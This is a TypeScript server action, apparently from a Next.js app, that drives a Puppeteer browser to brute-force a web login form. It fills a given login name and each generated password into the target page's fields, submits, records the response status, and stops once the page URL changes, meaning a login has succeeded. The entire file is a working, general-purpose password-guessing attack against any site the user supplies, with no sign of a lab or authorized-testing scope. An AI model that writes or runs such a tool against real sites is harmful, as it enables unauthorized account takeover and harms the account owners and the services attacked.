"use server";

import puppeteer from "puppeteer";
import { BruteForceSchema } from "./models/brute-force-schema.model";
import { generatePasswords } from "./utils/generate-passwords.util";

export async function submitBruteForceForm(data: BruteForceSchema) {
  const browser = await puppeteer.launch({
    headless: false,
  });
  const pages = await browser.pages();
  const page = pages[0];

  // Navigate the page to a URL
  await page.goto(data.url, { waitUntil: "networkidle0" });
  await page.waitForSelector(data.loginFieldSelector);

  const passwords = generatePasswords();

  const responses = [];

  for (const password of passwords) {
    await page.waitForNetworkIdle();

    if (page.url() !== data.url) {
      break;
    }

    await page.locator(data.loginFieldSelector).fill(data.loginName);
    await page.locator(data.passwordFieldSelector).fill(password);

    await page.locator(data.loginButtonSelector).click();

    const response = await page.waitForResponse((response) => {
      const request = response.request();
      const postData = request.postData();

      if (postData) {
        return (
          postData.includes(encodeURIComponent(data.loginName)) &&
          postData.includes(encodeURIComponent(password))
        );
      }

      return (
        request.url().includes(encodeURIComponent(data.loginName)) &&
        request.url().includes(encodeURIComponent(password))
      );
    });

    responses.push({
      login: data.loginName,
      password,
      statusCode: response.status(),
    });
  }

  await browser.close();

  return { responses };
}
